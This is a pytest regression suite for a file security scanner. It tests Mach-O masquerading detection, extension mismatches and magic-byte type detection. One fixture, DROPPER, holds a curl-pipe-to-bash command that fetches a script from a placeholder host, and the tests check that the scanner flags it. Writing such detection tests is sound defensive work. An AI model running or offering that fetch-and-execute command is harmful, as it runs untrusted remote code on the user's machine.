"""Regressions in security_scanner / file_inspector found while porting them to the web interface."""
import pytest

from src.security_scanner import scan_file

MACHO = {
    "macho32": b"\xfe\xed\xfa\xce" + bytes(28),
    "macho64": b"\xfe\xed\xfa\xcf" + bytes(28),
    "macho-fat": b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + bytes(24),
    "macho64-le": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + bytes(24),
}


def _cats(r):
    return {(f.category, f.severity) for f in r.findings}


@pytest.mark.parametrize("kind", sorted(MACHO))
def test_macho_renamed_to_document_is_flagged(tmp_path, kind):
    p = tmp_path / "invoice.pdf"
    p.write_bytes(MACHO[kind])
    r = scan_file(p)
    assert r.detected_kind == kind
    assert ("extension_mismatch", "dangerous") in _cats(r)


@pytest.mark.parametrize("name", ["libfoo.dylib", "tool", "plugin.bundle", "main.o"])
def test_macho_with_its_own_extension_is_not_a_mismatch(tmp_path, name):
    p = tmp_path / name
    p.write_bytes(MACHO["macho64-le"])
    assert not any(f.category == "extension_mismatch" for f in scan_file(p).findings)


DROPPER = b"curl -fsSL https://example.invalid/i.sh | bash\n"


@pytest.mark.parametrize("name,data", [
    ("install", b"#!/bin/sh\n" + DROPPER),      # extension-less shebang script (kind "script")
    ("notes.txt", b"run this:\n" + DROPPER),    # plain text (kind "unknown")
    ("run.conf", DROPPER),
])
def test_shell_patterns_scanned_in_any_text_file(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    assert ("suspicious_pattern", "warning") in _cats(scan_file(p))


def test_binary_file_not_pattern_scanned(tmp_path):
    p = tmp_path / "blob.bin"
    p.write_bytes(b"\x00\x01" + DROPPER)
    assert not any(f.category == "suspicious_pattern" for f in scan_file(p).findings)


def test_magic_wins_over_extension_hint(tmp_path):
    from src.file_inspector import inspect_file
    p = tmp_path / "report.dat"
    p.write_bytes(b"%PDF-1.4\n%\xe2\xe3\n")
    info = inspect_file(p)
    assert (info.detected_kind, info.detected_via) == ("pdf", "magic")
    assert ("extension_mismatch", "warning") in _cats(scan_file(p))


@pytest.mark.parametrize("name,data,kind", [
    ("arr.npz", b"PK\x03\x04" + bytes(30), "npz"),          # zip container refined by extension
    ("lib.jar", b"PK\x03\x04" + bytes(30), "jar"),
    ("climate.nc", b"\x89HDF\r\n\x1a\n" + bytes(20), "netcdf"),
    ("table.feather", b"ARROW1" + bytes(20), "feather"),
    ("model.pkl", b"\x80\x04\x95" + bytes(20), "pickle"),
    ("store.db", b"SQLite format 3\x00" + bytes(84), "sqlite"),  # magic is certain; no "sqlite?"
    ("photo.bin", b"\x89PNG\r\n\x1a\n" + bytes(20), "png"),
])
def test_extension_only_refines_generic_containers(tmp_path, name, data, kind):
    from src.file_inspector import inspect_file
    p = tmp_path / name
    p.write_bytes(data)
    assert inspect_file(p).detected_kind == kind
